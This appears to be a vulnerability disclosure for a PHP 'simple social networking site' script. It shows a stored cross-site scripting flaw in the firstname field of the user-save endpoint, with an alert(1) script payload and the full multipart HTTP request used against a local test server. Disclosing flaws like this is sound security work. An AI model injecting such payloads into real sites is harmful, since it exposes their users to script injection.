# simple-social-networking-site-instagram v1.0 - Cross-site Scripting (XSS)

vendors: https://www.sourcecodester.com/php/15311/simple-social-networking-site-instagram-phpoop-free-source-code.html

Date: 2022-05-07

Vulnerability File: /sns/classes/Users.php?f=save

Vulnerability location: /sns/classes/Users.php?f=save, firstname

[+] Payload: <sCrIpT>alert(1)</sCrIpT>

Tested on Windows 10, XAMPP

```
POST /sns/classes/Users.php?f=save HTTP/1.1
Host: 192.168.2.106
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------2778781845921125101691173168
Content-Length: 1036
Origin: http://192.168.2.106
Connection: keep-alive
Referer: http://192.168.2.106/sns/admin/?page=user/manage_user
Cookie: PHPSESSID=0389fublnj7ggho8q04fuvfaqe

-----------------------------2778781845921125101691173168
Content-Disposition: form-data; name="id"


-----------------------------2778781845921125101691173168
Content-Disposition: form-data; name="firstname"

<ScRiPt>alert(1)</ScRiPt>
-----------------------------2778781845921125101691173168
Content-Disposition: form-data; name="middlename"

123
-----------------------------2778781845921125101691173168
Content-Disposition: form-data; name="lastname"

123
-----------------------------2778781845921125101691173168
Content-Disposition: form-data; name="username"

123
-----------------------------2778781845921125101691173168
Content-Disposition: form-data; name="password"

123
-----------------------------2778781845921125101691173168
Content-Disposition: form-data; name="type"

2
-----------------------------2778781845921125101691173168
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream


-----------------------------2778781845921125101691173168--

```

![](https://github.com/mikeccltt/sns_bug_report/blob/main/simple-social-networking-site-instagram/xss.gif?raw=true)
